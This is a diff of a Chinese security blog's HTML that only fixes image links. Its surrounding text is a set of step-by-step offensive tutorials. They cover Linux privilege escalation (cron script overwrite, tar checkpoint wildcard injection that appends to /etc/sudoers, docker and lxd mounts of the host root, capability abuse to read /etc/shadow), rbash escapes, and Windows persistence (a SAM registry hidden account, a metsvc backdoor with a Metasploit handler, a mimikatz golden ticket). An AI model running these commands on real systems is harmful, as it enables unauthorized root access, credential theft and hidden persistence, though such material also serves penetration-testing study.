 <p><strong>crontab文件覆盖</strong></p>
 <p>这里以root用户创建一下测试环境，首先创建一个cron，运行一个脚本，该脚本功能是定时清除特定目录，例如&#x2F;tmp&#x2F;filetest。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021703510.png" alt="image-20231002170343455"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021703510.png" alt="image-20231002170343455"></p>
 <p>这里写一个py脚本，并添加执行权限（chmod 777 clear.py）</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021704946.png" alt="image-20231002170401888"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704946.png" alt="image-20231002170401888"></p>
 <p>然后添加定时任务。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021704297.png" alt="image-20231002170422230"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704297.png" alt="image-20231002170422230"></p>
 <p>这时每隔两分钟，clear脚本就会被执行一次。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021704045.png" alt="image-20231002170447982"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704045.png" alt="image-20231002170447982"></p>
 <p>提权方法就是替换clear脚本的内容，我们可以往脚本添加相关的命令，即把&#x2F;bin&#x2F;dash设置为suid权限即可</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021705474.png" alt="image-20231002170512410"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021705474.png" alt="image-20231002170512410"></p>
 <p>dash相比bash要小，运行速度更快，如果是脚本调用，可以使用dash。随后可以看到dash具有suid权限，运行然后添加p参数来继承上级权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021705264.png" alt="image-20231002170529203"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021705264.png" alt="image-20231002170529203"></p>
 <p>除此外，也可以添加修改sudoers或者添加etc&#x2F;passwd的命令等等。</p>
 <p><strong>通配符介绍</strong></p>
 <p>linux中有很多通配符，和正则类似，例如tar一个目录，如果写 * ，就代表压缩当前目录下的所有文件，* 代表一个或多个字符。</p>
 <p>在操作过程中，如果有文件名的名字是一个参数，那么执行过程中，就会被当作参数运行。例如一个目录下有一个叫–help的文件，当cat查看该文件内容时，实际上确是cat的帮助信息。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021706130.png" alt="image-20231002170602067"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021706130.png" alt="image-20231002170602067"></p>
 <p><strong>crontab通配符注入</strong></p>
 <p>常见的定时任务除了定时清除文件外，定时压缩也会很常见，例如有一个定时任务，每分钟回去执行&#x2F;var&#x2F;www&#x2F;html&#x2F;cron.sh脚本，该脚本是备份html网站，脚本内容如下，记得修改权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">cd /var/www/html/</span><br><span class="line">tar cf /var/backups/html.tar *</span><br></pre></td></tr></table></figure>
 
 <p>添加定时任务，每分钟执行一次</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021706203.png" alt="image-20231002170625165"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021706203.png" alt="image-20231002170625165"></p>
 <p>此时可以验证下，定时任务已经生效</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021707873.png" alt="image-20231002170706823"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707873.png" alt="image-20231002170706823"></p>
 <p>在tar命令中有一个checkpoint参数，即检查点，比如checkpoint&#x3D;1，则代表压缩过程中每压缩一个文件就去执行一个检查操作。</p>
 <p>而这个检查操作的参数是**–checkpoint-action&#x3D;exec&#x3D;**，后面可以跟要执行的命令。</p>
 <p>利用思路就是我们写入一个sh脚本，该脚本作用是修改sudoers文件，把当前用户添加进去，获得sudo所有权，从而进行提权。然后利用checkpoint-action&#x3D;exec&#x3D;接一个执行sh脚本的命令即可。</p>
@@ -793,22 +793,22 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;echo &quot;aaa ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27; &gt; test.sh</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br></pre></td></tr></table></figure>
 
 <p>等待一分钟后，sudoers就会被追加aaa用户的权限，然后就可以使用sudo bash来提权</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021707719.png" alt="image-20231002170723667"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707719.png" alt="image-20231002170723667"></p>
 <p>这里查看当前用户的sudo权限也可以发现，每分钟sudoers就会被追加一行。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021707145.png" alt="image-20231002170746091"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707145.png" alt="image-20231002170746091"></p>
 <p><strong>利用Docker进行提权</strong></p>
 <p>在docker中，是允许访问root用户和docker组中的其它用户的，测试如下。</p>
 <p>首先以root身份把一个普通账号添加到docker组，这里是aaa用户。然后使用newgrp将root账号初始组切换为docker。</p>
 <p>usermod命令用来修改指定用户的属组，G参数指定要添加的组名称。</p>
 <p>newgrp命令切换默认属组。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021708726.png" alt="image-20231002170815680"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021708726.png" alt="image-20231002170815680"></p>
 <p>然后切换到aaa，可以看到当前已在docker组。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021708515.png" alt="image-20231002170832471"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021708515.png" alt="image-20231002170832471"></p>
 <p>随后使用docker run来允许alpine镜像（小型Linux系统），v参数进行挂载，是将宿主机的root目录挂载到alpine的mnt下，使用冒号分隔。i参数是保持打开状态，t参数是分配一个tty终端，it一般结合使用，即保持通讯终端的打开。</p>
 <p>这时访问docker镜像alpine，就相当于访问宿主机的root目录，权限变成了root。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /root:/mnt -it alpine</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021709892.png" alt="image-20231002170900822"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709892.png" alt="image-20231002170900822"></p>
 <p>利用方式还有很多，例如将宿主机的etc挂载过来，然后查看shadow文件，进行密码破解。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /etc/:/mnt -it alpine</span><br></pre></td></tr></table></figure>
 
@@ -833,26 +833,26 @@
 <p>zfs是一个文件系统类型，具体说明可参考如下链接</p>
 <p><a target="_blank" rel="noopener" href="https://blog.dustinkirkland.com/2016/02/zfs-is-fs-for-containers-in-ubuntu-1604.html">https://blog.dustinkirkland.com/2016/02/zfs-is-fs-for-containers-in-ubuntu-1604.html</a></p>
 <p>这里测试aaa账户，把aaa添加到 lxd组</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021709579.png" alt="image-20231002170928534"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709579.png" alt="image-20231002170928534"></p>
 <p>随后使用lxd命令进行lxd初始化，在初始化过程中，对于存储选项默认是zfs，这里改成dir，其它默认即可，如下图。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021709699.png" alt="image-20231002170948639"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709699.png" alt="image-20231002170948639"></p>
 <p>lxd初始化后，就可以进行容器部署了。</p>
 <p>这里先使用lxc来启动一个容器，会现在本地找，本地没有会去下载部署然后启动</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711925.png" alt="image-20231002171101874"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711925.png" alt="image-20231002171101874"></p>
 <p>容器部署启动后，就可以通过lxc list命令来查看已经启动的容器。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711697.png" alt="image-20231002171116650"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711697.png" alt="image-20231002171116650"></p>
 <p>这时环境就可以了</p>
 <p><strong>攻击机设置</strong></p>
 <p>这里攻击机以kali为例，首先需要下载alpine，然后进行build构建，命令如下图</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711025.png" alt="image-20231002171128953"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711025.png" alt="image-20231002171128953"></p>
 <p>此时就会生成一个tar.gz包，把该包传到目标机的tmp下</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711198.png" alt="image-20231002171153128"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711198.png" alt="image-20231002171153128"></p>
 <p>导入tmp后，我们把该映像添加到lxd中，添加后可通过lxc image list查看</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021712359.png" alt="image-20231002171238297"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021712359.png" alt="image-20231002171238297"></p>
 <p>随后进行提权操作，相关命令和说明如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># lxc init来初始化myimage，也就是alpine系统，并创建aaa账户，这里指的就是自己，通过c参数来配置安全提升策略为true，代表aaa可申请高级权限，命令如下：</span><br><span class="line">lxc init myimage aaa -c security.privileged=true</span><br><span class="line"># lxc config device命令用来配置设备，add把mydevice设备添加到了aaa账户中，disk是磁盘挂载，把本机/目录挂载到容器的/mnt下，recursive即是否递归，代表是否将所有子目录及所有文件进行挂载，命令如下：</span><br><span class="line">lxc config device add aaa mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line"># 然后利用lxc start来启动刚刚添加的用户</span><br><span class="line">lxc start aaa</span><br><span class="line"># 最后利用lxc exec来执行程序，以aaa执行sh</span><br><span class="line">lxc exec aaa /bin/sh</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021714486.png" alt="image-20231002171403438"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021714486.png" alt="image-20231002171403438"></p>
 <p><strong>总结</strong></p>
 <p>1，目标机安装了lxd容器，且需要利用的普通用户在lxd组。</p>
 <p>2，下载alpine（轻量级的linux系统，大小在5m左右），传到目标机。</p>
@@ -899,44 +899,44 @@
 <p><strong>capability测试</strong></p>
 <p>setcap设置能力，getcat读取能力。</p>
 <p>getcap通过r参数来读取指定目录下有能力的程序</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021714104.png" alt="image-20231002171450060"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021714104.png" alt="image-20231002171450060"></p>
 <p><strong>能力滥用导致的提权</strong></p>
 <p>例如管理员要为python3程序设置超级权限给aaa用户，但没有用suid或sudo授权，而用的是capabilities，通过的是以下命令来设置的。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021715042.png" alt="image-20231002171531000"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021715042.png" alt="image-20231002171531000"></p>
 <p>因为root只想给aaa用户的python3能力，所以这里是将程序复制到了aaa用户下，如果直接设置bin下的python3程序，那么意味着任何用户都具有了相关能力。</p>
 <p>这时获取了aaa账户，然后通过getcap命令发现python3具有setuid能力，且属主和属于都是root。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021715175.png" alt="image-20231002171544130"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021715175.png" alt="image-20231002171544130"></p>
 <p>那么普通用户aaa就可执行python3程序来导入os包执行系统命令，从而进行提权。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021716322.png" alt="image-20231002171636279"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021716322.png" alt="image-20231002171636279"></p>
 <p>同理，下面是perl程序的测试：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021717923.png" alt="image-20231002171736861"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021717923.png" alt="image-20231002171736861"></p>
 <p>如果是一些无法调用命令的程序，例如tar，则可以想办法读取密码文件，然后进行破解的方式来提权。</p>
 <p>下面是tar的测试：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021717471.png" alt="image-20231002171756421"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021717471.png" alt="image-20231002171756421"></p>
 <p>这里赋予了cap_dac_read_search能力，即忽略文件读取和目录搜索的限制。</p>
 <p>利用思路：压缩etc&#x2F;shadow文件，然后解压查看密码，进行破解</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021718131.png" alt="image-20231002171820063"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718131.png" alt="image-20231002171820063"></p>
 <p>之后破解密码即可</p>
 <p><strong>rbash绕过总结</strong></p>
 <p>rbash是Restricted bash缩写，即受限制的bash。管理员可通过指定普通用户的bash为rbash，以此来限制相关操作。在rbash中，很多行为和命令都会被受到限制。</p>
 <p>PS：这种确切说不属于提权，只是绕过rbash的限制，因为绕过后身份依旧是当前的普通账户。</p>
 <p>这里测试aaa账户，使用root将aaa账户的bash改为rbash。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021718547.png" alt="image-20231002171835503"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718547.png" alt="image-20231002171835503"></p>
 <p>然后切换为aaa账号，发现环境为rbash，shell环境是rbash</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021718742.png" alt="image-20231002171846681"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718742.png" alt="image-20231002171846681"></p>
 <p><strong>vi绕过</strong></p>
 <p>可以进入vi中执行set命令将shell改为&#x2F;bin&#x2F;sh，命令如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell=/bin/sh #回车</span><br><span class="line">:shell #回车</span><br><span class="line">cd /etc</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021719260.png" alt="image-20231002171912200"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719260.png" alt="image-20231002171912200"></p>
 <p><strong>ed绕过</strong></p>
 <p>ed也是一个文件编辑的命令，和vi类似，也是内联编辑模式，可输入命令，相关命令如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ed</span><br><span class="line">!&#x27;/bin/sh&#x27;</span><br><span class="line">cd /etc</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021719510.png" alt="image-20231002171926461"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719510.png" alt="image-20231002171926461"></p>
 <p><strong>sh、bash、dash绕过</strong></p>
 <p>默认情况下，可以在rbash中执行sh、bash、dash等命令，以此来绕过rbash。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021719991.png" alt="image-20231002171949941"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719991.png" alt="image-20231002171949941"></p>
 <p>同理，如果这些命令不被运行，而cp允许，则可以把这些文件复制到当前目录运行，但是当&#x2F;符号不被允许的话，则复制到当前目录的文件是无法执行的。</p>
 <p><strong>python、perl绕过</strong></p>
 <p>可以尝试运行python和perl命令，如果允许执行，则可以用程序来调用bin&#x2F;bash绕过rbash，相关命令如下：</p>
@@ -947,20 +947,20 @@
 <p>awk命令通过BEGIN参数来指定执行前的语句，命令如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021720343.png" alt="image-20231002172014298"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021720343.png" alt="image-20231002172014298"></p>
 <p><strong>more绕过</strong></p>
 <p>more命令读取文件内容时，可输入!’sh’进入sh来绕过rbash，这个需要当前目录下有文件可读，例如这里是在当前用户的家目录，则都会有.bashrc等文件，命令如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">more .bashrc</span><br><span class="line">!&#x27;sh&#x27;</span><br><span class="line">cd /</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
 
 <p>（特别的，需要读取的文件内容较长，否则直接会输出，不进入命令行）</p>
 <p>这里以桌面的1.txt文件为例：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021720560.png" alt="image-20231002172035522"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021720560.png" alt="image-20231002172035522"></p>
 <p>类似于more的可利用命令，还有less、man等，用法类似。</p>
 <p><strong>ssh登录绕过</strong></p>
 <p>ssh进行远程登录时，可通过t参数来强制分配给自己伪终端，指定强制分配给自己bash，然后指定–noprofile参数。bash默认允许时会调用当前用户的bashrc等配置，该参数添加后，bash启动不会读取当前用户的默认配置。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh aaa@192.168.159.167 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021721244.png" alt="image-20231002172118186"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021721244.png" alt="image-20231002172118186"></p>
 <p><strong>漏洞提权</strong></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></p>
@@ -969,7 +969,7 @@
 <p><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
 <p><strong>总结</strong></p>
 <p>一般情况下建议的是先查找非漏洞的提权方法，如果没有，则再根据内核版本来查找相关的提权漏洞</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021721564.png" alt="image-20231002172139507"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021721564.png" alt="image-20231002172139507"></p>
 <p><a target="_blank" rel="noopener" href="https://cxsecurity.com/">https://cxsecurity.com/</a></p>
 
       
@@ -1018,19 +1018,19 @@
 <p>为了更好地隐藏我们的后门账户，我们还要开启目标主机的远程桌面进行如下操作。</p>
 <p>打开注册表编辑器，找到<code>HKEY_LOCAL_MACHINE\SAM\SAM</code>，单机右建，选择“权限”，把Administrator用户的权限，设置成“完全控制”权限，然后关闭注册表编辑器，再次打开即可。</p>
 <p>然后，在注册表编辑器的<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>处，点击Administrator用户，在左侧找到和在右边显示的键值的类型一项“0x1f4”相同的目录名，也就是箭头所指目录“000001F4”：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021624044.png" alt="image-20231002162407975"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624044.png" alt="image-20231002162407975"></p>
 <p>复制<code>000001F4</code>目录中的F键的值：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021624718.png" alt="image-20231002162423630"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624718.png" alt="image-20231002162423630"></p>
 <p>然后找到与隐藏账户whoami$右边类型的键值“0x3e9”相同的目录名，也就是。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021624801.png" alt="image-20231002162436740"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624801.png" alt="image-20231002162436740"></p>
 <p>然后将<code>000001F4</code>的F值粘贴到<code>000003E9</code>的F值中，点击确定：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021624891.png" alt="image-20231002162448810"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624891.png" alt="image-20231002162448810"></p>
 <p>然后从注册表中右键导出<code>000003E9</code>和whoami$，并删除whoami$用户 <code>net user whoami$ /del</code>：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021625703.png" alt="image-20231002162504620"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021625306.png" alt="image-20231002162518224"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021625703.png" alt="image-20231002162504620"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021625306.png" alt="image-20231002162518224"></p>
 <p>此时，查看注册表以及本地用户和组或者控制面板，whoami$用户已经没有了：</p>
 <p>最后，将刚才导出的两个后缀为.reg的注册表项导入注册表中：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021625486.png" alt="image-20231002162550401"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021625486.png" alt="image-20231002162550401"></p>
 <p>这样我们的隐藏账户whoami$就创建好了。现在，不管你是在命令提示符下输入 net user 或者在系统用户管理界面都是看不到whoami$这个账户的，只有在注册表中才能看得到。</p>
 <h2 id="Shift-粘滞键后门"><a href="#Shift-粘滞键后门" class="headerlink" title="Shift 粘滞键后门"></a>Shift 粘滞键后门</h2><p>如果你在电脑上连按五次shift键，你就会发现电脑屏幕上弹出了一个叫做“粘滞键”的程序</p>
 <p>即使在没有登录进系统之前，连按五次shift键也可以弹出这个程序</p>
@@ -1182,7 +1182,7 @@
 <p>我们在攻击机上新开启一个metasploit监听，当目标主机重启时，目标主机便能上线，如果成功得到目标机的meterpreter，并且还是system权限的</p>
 <p>注意：不要忘记迁移进程。<code>set AutoRunScript migrate -f</code></p>
 <h3 id="Metasploit下的利用"><a href="#Metasploit下的利用" class="headerlink" title="Metasploit下的利用"></a>Metasploit下的利用</h3><p>Metasploit框架还具有一个后渗透模块：“post&#x2F;windows&#x2F;manage&#x2F;persistence_exe”，该模块需要以下配置，并将可执行文件放置在目标主机的可写位置：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021626587.png" alt="image-20231002162659500"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021626587.png" alt="image-20231002162659500"></p>
 <p>如上图所示，该模块支持的持久性技术有：</p>
 <ol>
 <li>注册表运行键后门（USER，即我们前文提到的“run persistence”命令就是用的这个技术）</li>
@@ -1203,7 +1203,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –h   # 查看帮助</span><br><span class="line">run metsvc –A   #自动安装后门</span><br></pre></td></tr></table></figure>
 
 <p>我们使用<code>run metsvc –A</code>自动安装后门</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021627787.png" alt="image-20231002162721705"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021627787.png" alt="image-20231002162721705"></p>
 <p>接着我们启用另一个终端并进入msfconsole，使用如下命令即可连接后门：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set RHOST 192.168.137.135      //目标机ip</span><br><span class="line">set LPORT 31337     //如上图，后门安装过程信息中有</span><br><span class="line">exploit     //获取到的会话是system权限</span><br></pre></td></tr></table></figure>
 
@@ -1244,31 +1244,31 @@
 <li>krbtgt的NTLM Hash</li>
 </ul>
 <p>测试环境如下所示：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021627343.png" alt="image-20231002162744273"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021627343.png" alt="image-20231002162744273"></p>
 <p>我们已经获得了普通域用户主机Windows7和域控制器DC的控制权，下面我们演示如何用黄金票据建立一个稳固的后门。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">域成员主机：Windows 7（192.168.183.131）</span><br><span class="line">域名：DEMO.com</span><br><span class="line">用户名：douser</span><br><span class="line"></span><br><span class="line">域控制器：192.168.183.130</span><br><span class="line">域名：DEMO.com </span><br><span class="line">用户名：administrator</span><br></pre></td></tr></table></figure>
 
 <p>首先，我们登上域控制器，上传mimikatz，然后执行如下命令抓取krbtgt用户的Hash值并获取域sid：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch        // 专用于在域控制器上导出用户密码或hash</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021628046.png" alt="image-20231002162800861"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628046.png" alt="image-20231002162800861"></p>
 <p>如上图所示，我们得到krbtgt用户的Hash为：7c4ed692473d4b4344c3ba01c5e6cb63，域sid为S-1-5-21-979886063-1111900045-1414766810</p>
 <p>然后，我们切换到普通域用户的机器Windows 7，用mimikatz生成名为ticket.kirbi的TGT凭证，用户名为域管理员用户（administrator）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:DEMO.com /sid:S-1-5-21-979886063-1111900045-1414766810 /krbtgt:7c4ed692473d4b4344c3ba01c5e6cb63 /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021628610.png" alt="image-20231002162821391"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628610.png" alt="image-20231002162821391"></p>
 <p>生成TGT凭证ticket.kirbi成功，名为ticket.kirbi，然后使用mimikatz将凭证ticket.kirbi注入进去：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge   //先清空所有票据</span><br><span class="line">kerberos::ptt ticket.kirbi    //再将生成的票据注入域用户主机Windows7中</span><br><span class="line">// kerberos::ptt &lt;票据文件&gt;   </span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021628253.png" alt="image-20231002162834188"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628253.png" alt="image-20231002162834188"></p>
 <p>此时查看当前会话中的票据，就可以发现刚刚注入的票据在里面了：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021628160.png" alt="image-20231002162845006"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628160.png" alt="image-20231002162845006"></p>
 <p>到此，注入成功。输入“exit”退出mimikatz，此时，攻击者就可以利用Windows 7任意访问域控制器了，可以使用net use进行登录</p>
